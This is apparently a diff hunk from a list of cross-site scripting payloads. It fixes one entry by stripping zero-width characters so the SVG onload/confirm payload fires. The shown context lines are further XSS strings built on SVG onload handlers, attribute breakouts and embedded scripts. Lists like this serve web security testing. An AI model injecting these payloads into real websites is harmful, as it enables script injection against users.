@@ -44,7 +44,7 @@ a onclick="alert(1)">XSS</a>
 <svg onxss=() onload='setTimeout`alert\x281\x29`'>
 <acronym><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
 <xmp><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
--->'"/><​/sCript><svG x=">" onload​=(co\u006efirm)``>
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
 <svg xmlns="http://w3.org/2000/svg" onload="this.setAttribute('onmouseover','confirm(1)')"></svg>
 /svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" onload​="alert('XSS via SVG!')"><circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" /></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><script>prompt("XSS")</script></svg>
